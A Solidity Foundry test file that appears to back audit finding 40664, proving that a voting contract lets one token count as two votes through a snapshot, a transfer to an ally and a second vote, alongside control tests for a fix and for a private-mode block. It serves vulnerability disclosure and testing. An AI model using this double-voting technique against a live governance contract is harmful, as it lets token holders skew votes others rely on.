// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Exploit, DToken, Votes, Voting, Ally} from "./40664-anyone-can-vote-multiple-times-by-using-multiple-addresses-a.sol";

contract Finding40664Test is Test {
    function test_exploit_one_token_counts_as_two_votes() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.powerAfterFirst(), 1, "first");
        assertEq(e.powerAfterSecond(), 2, "doubled");
        assertEq(e.supply(), 1, "one token");
        assertEq(e.profit(), 2, "profit");
        assertEq(e.token().balanceOf(address(e.ally())), 1, "ally holds it");
        assertEq(e.voting().powerOf(address(e)), 1, "sender power not cleared");

        console.log("DToken supply", e.supply());
        console.log("votes after first snapshot", e.powerAfterFirst());
        console.log("votes after transfer and second snapshot", e.powerAfterSecond());
    }

    function test_control_moving_power_on_transfer_stays_at_one_vote() public {
        DToken token = new DToken();
        Votes votes = new Votes();
        Voting voting = new Voting(token, votes);
        Ally ally = new Ally();
        token.mint(address(this), 1);

        voting.updatePower(true);
        assertEq(voting.attackerPower(), 1, "snapshot");

        token.transfer(address(ally), 1);
        voting.movePower(address(this), 1);
        ally.vote(voting);

        assertEq(token.totalSupply(), 1, "supply");
        assertEq(voting.attackerPower(), 1, "still doubled");
        assertEq(voting.powerOf(address(this)), 0, "sender not cleared");
        console.log("control votes", voting.attackerPower());
    }

    function test_control_private_mode_blocks_the_transfer() public {
        DToken token = new DToken();
        token.mint(address(this), 1);
        token.setPrivateMode(true);
        vm.expectRevert(bytes("private"));
        token.transfer(address(0xBEEF), 1);
        assertEq(token.balanceOf(address(this)), 1, "moved");
    }
}
